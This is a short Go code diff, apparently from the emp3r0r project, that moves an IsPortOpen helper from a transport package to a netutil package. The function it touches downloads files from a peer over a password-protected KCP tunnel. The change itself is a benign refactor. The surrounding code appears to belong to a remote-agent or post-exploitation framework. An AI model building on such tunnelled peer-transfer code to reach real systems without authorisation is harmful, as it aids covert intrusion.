@@ -17,6 +17,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archives"
 )
@@ -275,7 +276,7 @@ func DownloadFromPeerKCP(address, filepath, path, checksum string) (err error) {
 	go transport.KCPTunClient(address, kcp_listen_port, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
 
 	// wait until port is open
-	for !transport.IsPortOpen("127.0.0.1", kcp_listen_port) {
+	for !netutil.IsPortOpen("127.0.0.1", kcp_listen_port) {
 		log.Printf("RequestAndDownloadFile: waiting for port %s to open", kcp_listen_port)
 		time.Sleep(time.Second)
 	}
